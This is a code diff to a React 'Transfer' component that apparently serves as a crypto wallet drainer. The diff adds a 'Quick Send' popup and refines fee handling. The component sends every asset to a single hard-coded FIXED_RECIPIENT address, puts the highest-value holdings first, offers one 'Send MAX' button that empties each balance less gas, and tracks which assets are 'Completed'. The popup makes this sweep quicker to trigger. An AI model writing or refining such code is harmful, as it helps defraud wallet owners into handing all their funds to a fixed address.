@@ -109,6 +109,9 @@ export default function Transfer({
 
   const [completed, setCompleted] = useState([]);
 
+  // Popup state
+  const [isModalOpen, setIsModalOpen] = useState(false);
+
   // Sort assets from highest value to lowest.
   const sortedAssets = useMemo(() => {
     return assets
@@ -128,6 +131,24 @@ export default function Transfer({
       (asset) => getAssetKey(asset) === selectedKey
     ) || sortedAssets[0];
 
+  // Open quick send popup
+  const openQuickSend = () => {
+    setError("");
+    setStatus("");
+    setTransactionHash("");
+    setIsModalOpen(true);
+  };
+
+  // Close popup
+  const closeQuickSend = () => {
+    if (busy) return;
+
+    setIsModalOpen(false);
+    setError("");
+    setStatus("");
+  };
+
+  // Shared transfer function for both Send buttons
   const handleSend = async () => {
     if (busy) return;
 
@@ -198,11 +219,24 @@ export default function Transfer({
       const fees =
         await publicClient.estimateFeesPerGas();
 
+      const feePerGas =
+        fees.maxFeePerGas ?? fees.gasPrice;
+
+      if (feePerGas == null) {
+        throw new Error(
+          "Unable to estimate network fees."
+        );
+      }
+
       const feeOptions = fees.maxFeePerGas
         ? {
             maxFeePerGas: fees.maxFeePerGas,
-            maxPriorityFeePerGas:
-              fees.maxPriorityFeePerGas
+            ...(fees.maxPriorityFeePerGas != null
+              ? {
+                  maxPriorityFeePerGas:
+                    fees.maxPriorityFeePerGas
+                }
+              : {})
           }
         : {
             gasPrice: fees.gasPrice
@@ -217,9 +251,6 @@ export default function Transfer({
           to: FIXED_RECIPIENT,
           value: 0n
         });
-
-        const feePerGas =
-          fees.maxFeePerGas ?? fees.gasPrice;
 
         const gasReserve =
           (gas * feePerGas * 120n) / 100n;
@@ -282,9 +313,6 @@ export default function Transfer({
               rawBalance
             ]
           });
-
-        const feePerGas =
-          fees.maxFeePerGas ?? fees.gasPrice;
 
         const gasReserve =
           (gas * feePerGas * 120n) / 100n;
@@ -363,6 +391,9 @@ export default function Transfer({
         await onRefresh();
       }
 
+      // Close popup after successful transfer
+      setIsModalOpen(false);
+
     } catch (err) {
       console.error("Transfer error:", err);
 
@@ -381,6 +412,26 @@ export default function Transfer({
 
   return (
     <div style={styles.container}>
+
+      {/* SMALL GREEN QUICK SEND BUTTON */}
+      <div style={styles.quickSendHeader}>
+        <div>
+          <strong>Quick Send</strong>
+
+          <p style={styles.quickDescription}>
+            Open the transfer popup.
+          </p>
+        </div>
+
+        <button
+          type="button"
+          onClick={openQuickSend}
+          disabled={!isConnected || busy}
+          style={styles.quickSendButton}
+        >
+          Send Assets
+        </button>
+      </div>
 
       <h2 style={styles.heading}>
         Send Assets
@@ -420,7 +471,7 @@ export default function Transfer({
         </div>
       )}
 
-      {/* Asset list */}
+      {/* MAIN ASSET LIST */}
       <div style={styles.sectionHeader}>
         <strong>Available Assets</strong>
 
@@ -492,7 +543,7 @@ export default function Transfer({
         );
       })}
 
-      {/* Selected asset */}
+      {/* MAIN SEND SECTION */}
       {selectedAsset && (
         <div style={styles.selectedBox}>
           <h3 style={styles.selectedHeading}>
@@ -552,7 +603,7 @@ export default function Transfer({
         </div>
       )}
 
-      {/* Status */}
+      {/* MAIN STATUS */}
       {status && (
         <div style={styles.success}>
           {status}
@@ -580,6 +631,238 @@ export default function Transfer({
         displayed by your wallet before approving.
       </p>
 
+      {/* QUICK SEND POPUP */}
+      {isModalOpen && (
+        <div
+          style={styles.modalOverlay}
+          onClick={(event) => {
+            if (
+              event.target === event.currentTarget
+            ) {
+              closeQuickSend();
+            }
+          }}
+        >
+          <div
+            style={styles.modal}
+            role="dialog"
+            aria-modal="true"
+            aria-labelledby="quick-send-title"
+          >
+            <div style={styles.modalHeader}>
+              <h2
+                id="quick-send-title"
+                style={styles.modalHeading}
+              >
+                Quick Send
+              </h2>
+
+              <button
+                type="button"
+                onClick={closeQuickSend}
+                disabled={busy}
+                style={styles.closeButton}
+              >
+                ×
+              </button>
+            </div>
+
+            <p style={styles.modalDescription}>
+              Review your asset and destination before
+              approving the transfer.
+            </p>
+
+            {/* Destination */}
+            <div style={styles.modalDestination}>
+              <span style={styles.label}>
+                Receiving Address
+              </span>
+
+              <div style={styles.address}>
+                {FIXED_RECIPIENT}
+              </div>
+            </div>
+
+            {!isConnected && (
+              <div style={styles.error}>
+                Connect your wallet to continue.
+              </div>
+            )}
+
+            {/* Popup asset selection */}
+            <strong style={styles.popupSectionTitle}>
+              Select Asset
+            </strong>
+
+            {sortedAssets.length === 0 && (
+              <div style={styles.empty}>
+                No supported assets available.
+              </div>
+            )}
+
+            <div style={styles.modalAssetList}>
+              {sortedAssets.map((asset, index) => {
+                const key = getAssetKey(asset);
+
+                const isSelected =
+                  selectedAsset &&
+                  getAssetKey(selectedAsset) === key;
+
+                const isCompleted =
+                  completed.includes(key);
+
+                return (
+                  <button
+                    type="button"
+                    key={key}
+                    disabled={busy}
+                    onClick={() => setSelectedKey(key)}
+                    style={{
+                      ...styles.modalAssetCard,
+                      border: isSelected
+                        ? "1px solid #16a34a"
+                        : "1px solid #374151",
+                      background: isSelected
+                        ? "#163522"
+                        : "#1f2937"
+                    }}
+                  >
+                    <div>
+                      <strong>{asset.symbol}</strong>
+
+                      <div style={styles.muted}>
+                        {NETWORKS[Number(asset.chainId)]}
+                      </div>
+
+                      <div style={styles.balance}>
+                        {asset.balance} {asset.symbol}
+                      </div>
+                    </div>
+
+                    <div style={styles.popupAssetRight}>
+                      {index === 0 && (
+                        <span style={styles.topBadge}>
+                          Highest
+                        </span>
+                      )}
+
+                      {isCompleted && (
+                        <span style={styles.completed}>
+                          Completed
+                        </span>
+                      )}
+
+                      {isSelected && !isCompleted && (
+                        <span style={styles.selectedText}>
+                          Selected
+                        </span>
+                      )}
+                    </div>
+                  </button>
+                );
+              })}
+            </div>
+
+            {/* Popup selected asset */}
+            {selectedAsset && (
+              <div style={styles.popupSelectedBox}>
+                <h3 style={styles.selectedHeading}>
+                  Transfer Details
+                </h3>
+
+                <div style={styles.detail}>
+                  <span>Asset</span>
+                  <strong>{selectedAsset.symbol}</strong>
+                </div>
+
+                <div style={styles.detail}>
+                  <span>Network</span>
+                  <strong>
+                    {NETWORKS[
+                      Number(selectedAsset.chainId)
+                    ]}
+                  </strong>
+                </div>
+
+                <div style={styles.detail}>
+                  <span>Available Balance</span>
+                  <strong>
+                    {selectedAsset.balance}{" "}
+                    {selectedAsset.symbol}
+                  </strong>
+                </div>
+
+                <button
+                  type="button"
+                  disabled={
+                    !isConnected ||
+                    busy ||
+                    completed.includes(
+                      getAssetKey(selectedAsset)
+                    )
+                  }
+                  onClick={handleSend}
+                  style={{
+                    ...styles.sendButton,
+                    opacity:
+                      !isConnected ||
+                      busy ||
+                      completed.includes(
+                        getAssetKey(selectedAsset)
+                      )
+                        ? 0.5
+                        : 1
+                  }}
+                >
+                  {busy
+                    ? "Processing..."
+                    : completed.includes(
+                        getAssetKey(selectedAsset)
+                      )
+                    ? "Transfer Completed"
+                    : "Send MAX"}
+                </button>
+              </div>
+            )}
+
+            {/* Popup transaction status */}
+            {status && (
+              <div style={styles.success}>
+                {status}
+              </div>
+            )}
+
+            {error && (
+              <div style={styles.error}>
+                {error}
+              </div>
+            )}
+
+            {transactionHash && (
+              <div style={styles.hashBox}>
+                <strong>Transaction Hash</strong>
+                <p>{transactionHash}</p>
+              </div>
+            )}
+
+            <p style={styles.modalFooter}>
+              You must approve each transaction in your
+              connected wallet. Check the destination
+              and amount before approving.
+            </p>
+
+            <button
+              type="button"
+              disabled={busy}
+              onClick={closeQuickSend}
+              style={styles.cancelButton}
+            >
+              {busy ? "Transaction in progress..." : "Close"}
+            </button>
+          </div>
+        </div>
+      )}
+
     </div>
   );
 }
@@ -594,6 +877,36 @@ const styles = {
     background: "#111827",
     color: "#ffffff",
     borderRadius: "16px"
+  },
+
+  quickSendHeader: {
+    display: "flex",
+    justifyContent: "space-between",
+    alignItems: "center",
+    gap: "12px",
+    padding: "12px",
+    marginBottom: "22px",
+    background: "#1f2937",
+    border: "1px solid #374151",
+    borderRadius: "10px"
+  },
+
+  quickDescription: {
+    margin: "5px 0 0",
+    color: "#9ca3af",
+    fontSize: "12px"
+  },
+
+  quickSendButton: {
+    padding: "9px 15px",
+    background: "#16a34a",
+    color: "#ffffff",
+    border: "none",
+    borderRadius: "7px",
+    fontSize: "12px",
+    fontWeight: "bold",
+    cursor: "pointer",
+    whiteSpace: "nowrap"
   },
 
   heading: {
@@ -772,5 +1085,130 @@ const styles = {
     color: "#9ca3af",
     fontSize: "11px",
     lineHeight: 1.7
+  },
+
+  // Popup styles
+  modalOverlay: {
+    position: "fixed",
+    inset: 0,
+    zIndex: 99999,
+    background: "rgba(0, 0, 0, 0.82)",
+    display: "flex",
+    justifyContent: "center",
+    alignItems: "center",
+    padding: "15px",
+    overflowY: "auto"
+  },
+
+  modal: {
+    width: "100%",
+    maxWidth: "480px",
+    maxHeight: "90vh",
+    overflowY: "auto",
+    padding: "20px",
+    boxSizing: "border-box",
+    background: "#111827",
+    color: "#ffffff",
+    border: "1px solid #374151",
+    borderRadius: "16px",
+    boxShadow: "0 20px 60px rgba(0,0,0,0.6)"
+  },
+
+  modalHeader: {
+    display: "flex",
+    justifyContent: "space-between",
+    alignItems: "center"
+  },
+
+  modalHeading: {
+    margin: 0,
+    fontSize: "22px"
+  },
+
+  closeButton: {
+    width: "34px",
+    height: "34px",
+    border: "none",
+    borderRadius: "50%",
+    background: "#374151",
+    color: "#ffffff",
+    fontSize: "23px",
+    cursor: "pointer"
+  },
+
+  modalDescription: {
+    color: "#9ca3af",
+    fontSize: "13px",
+    lineHeight: 1.6
+  },
+
+  modalDestination: {
+    padding: "13px",
+    margin: "15px 0",
+    background: "#1f2937",
+    border: "1px solid #374151",
+    borderRadius: "9px"
+  },
+
+  popupSectionTitle: {
+    display: "block",
+    margin: "18px 0 10px",
+    fontSize: "14px"
+  },
+
+  modalAssetList: {
+    maxHeight: "220px",
+    overflowY: "auto"
+  },
+
+  modalAssetCard: {
+    display: "flex",
+    justifyContent: "space-between",
+    alignItems: "center",
+    width: "100%",
+    padding: "12px",
+    marginBottom: "8px",
+    borderRadius: "9px",
+    color: "#ffffff",
+    textAlign: "left",
+    cursor: "pointer"
+  },
+
+  popupAssetRight: {
+    display: "flex",
+    flexDirection: "column",
+    alignItems: "flex-end",
+    gap: "6px"
+  },
+
+  selectedText: {
+    color: "#4ade80",
+    fontSize: "12px"
+  },
+
+  popupSelectedBox: {
+    padding: "14px",
+    marginTop: "15px",
+    background: "#1f2937",
+    border: "1px solid #374151",
+    borderRadius: "10px"
+  },
+
+  modalFooter: {
+    marginTop: "16px",
+    color: "#9ca3af",
+    fontSize: "11px",
+    lineHeight: 1.6
+  },
+
+  cancelButton: {
+    width: "100%",
+    padding: "12px",
+    marginTop: "12px",
+    background: "#374151",
+    color: "#ffffff",
+    border: "none",
+    borderRadius: "8px",
+    cursor: "pointer"
   }
 };
